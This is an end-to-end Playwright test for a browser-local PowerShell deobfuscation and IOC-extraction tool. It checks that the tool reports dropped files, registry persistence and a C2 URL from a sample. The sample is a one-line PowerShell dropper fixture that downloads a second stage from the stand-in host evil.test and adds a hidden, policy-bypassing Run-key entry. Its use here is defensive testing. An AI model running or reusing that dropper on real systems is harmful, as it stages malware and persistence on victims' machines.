// Husk — PowerShell deobfuscation and IOC extraction, fully browser-local.
// SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
// Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)
//
// The whole chain, end to end: the built app, the published engine, the real UI.
//
// Unit tests cover the adapter against captured output and the loader against a
// fake worker. Neither can catch a wrong assumption about the boundary between
// them — and one was wrong: `readDropped` returns .NET's `byte[]`, which
// marshals to a Uint8Array, and the worker was decoding it as a hex string. The
// page threw `t.trim is not a function` and the Save button did nothing. Only
// driving the real thing finds that.
//
//   npm run build   # with VITE_HUSK_ENGINE_URL=/husk-engine/
//   cp -r <AppBundle> dist/husk-engine
//   node scripts/husk/engine/e2e.mjs
//
// Env: HUSK_DIST (default ./dist), HUSK_CHROME (default Playwright's own).

import { chromium } from 'playwright';
import { createServer } from 'node:http';
import { existsSync, readFileSync, statSync } from 'node:fs';
import { extname, join } from 'node:path';

const DIST = process.env.HUSK_DIST ?? 'dist';
const PORT = Number(process.env.HUSK_PORT ?? 4240);
const ORIGIN = `http://localhost:${PORT}`;

const TYPES = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json',
  '.wasm': 'application/wasm',
  '.dll': 'application/octet-stream',
  '.dat': 'application/octet-stream',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.woff2': 'font/woff2',
  '.symbols': 'text/plain',
};

// A dropper: download, drop, persist. Everything an analyst wants in one line,
// and nothing that needs a real machine.
const DROPPER = [
  `$u='http://evil.test/stage2.ps1'`,
  `$p="$env:APPDATA\\Updater.ps1"`,
  `(New-Object Net.WebClient).DownloadFile($u,$p)`,
  `Set-Content -Path 'C:\\Users\\Public\\note.txt' -Value 'dropped'`,
  `Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value "powershell -w hidden -ep bypass -f $p"`,
].join('; ');

const serve = () =>
  createServer((request, response) => {
    const path = decodeURIComponent(request.url.split('?')[0]);
    let file = join(DIST, path);
    // A single-page app: anything that is not a file is the shell.
    if (!existsSync(file) || statSync(file).isDirectory()) file = join(DIST, 'index.html');
    response.writeHead(200, { 'Content-Type': TYPES[extname(file)] ?? 'application/octet-stream' });
    response.end(readFileSync(file));
  });

let failures = 0;

function check(ok, what) {
  if (!ok) failures += 1;
  console.log(`  ${ok ? 'pass' : 'FAIL'}  ${what}`);
}

async function main() {
  if (!existsSync(join(DIST, 'husk-engine', '_framework', 'blazor.boot.json'))) {
    console.error(`no engine under ${DIST}/husk-engine — see the header of this file`);
    return 2;
  }

  const server = serve();
  await new Promise((ready) => server.listen(PORT, () => ready(undefined)));

  const browser = await chromium.launch({ executablePath: process.env.HUSK_CHROME });
  const page = await browser.newPage({ acceptDownloads: true });

  // The claim the whole tool rests on. Anything leaving the page fails the run.
  const offsite = [];
  page.on('request', (request) => {
    if (!request.url().startsWith(ORIGIN)) offsite.push(request.url());
  });
  const pageErrors = [];
  page.on('pageerror', (error) => pageErrors.push(String(error)));

  try {
    await page.goto(`${ORIGIN}/husk`, { waitUntil: 'networkidle' });

    const offer = page.locator('input[type=checkbox]');
    await offer.waitFor({ timeout: 30_000 });
    check((await offer.count()) === 1, 'the engine is offered once the probe finds it');

    await page.fill('#husk-input', DROPPER);
    await offer.check();
    await page.getByRole('button', { name: 'Analyse' }).click();

    // The summary line, not the checkbox label — "real PowerShell" appears in
    // both, and waiting on the label resolved immediately and read the page
    // mid-run. The interpunct is only in the summary.
    await page.waitForFunction(
      () => /real powershell\s*\u00b7/i.test(document.body.innerText),
      null,
      { timeout: 300_000 },
    );

    const text = (await page.locator('body').innerText()).toLowerCase();
    const shows = (needle) => text.includes(needle.toLowerCase());

    check(/real powershell\s*\u00b7/i.test(text), 'the result says which backend ran');
    check(shows('Files the sample wrote'), 'the dropped-file panel is there');
    check(shows('C:\\Users\\Public\\note.txt'), 'the dropped path is the one the sample used');
    check(shows('Registry the sample wrote'), 'the registry panel is there');
    check(shows('CurrentVersion\\Run'), 'the persistence key is reported');
    check(!shows('Shell Folders'), 'the values Husk seeded are not reported as writes');
    check(shows('http://evil.test/stage2.ps1'), 'the C2 URL was extracted');
    check(shows('provider'), 'each recorded call says where it was observed');

    // The payload leaving the sandbox for the analyst's own disk.
    const [download] = await Promise.all([
      page.waitForEvent('download', { timeout: 60_000 }),
      page.getByRole('button', { name: 'Save' }).first().click(),
    ]);
    check(
      download.suggestedFilename() === 'note.txt.malware',
      `the saved file is named for double-click safety (${download.suggestedFilename()})`,
    );

    check(pageErrors.length === 0, `no page errors${pageErrors.length ? `: ${pageErrors[0]}` : ''}`);
    check(offsite.length === 0, `nothing left the page${offsite.length ? `: ${offsite[0]}` : ''}`);
  } finally {
    await browser.close();
    server.close();
  }

  console.log(failures === 0 ? '\nall checks passed' : `\n${failures} CHECKS FAILED`);
  return failures === 0 ? 0 : 1;
}

process.exit(await main());
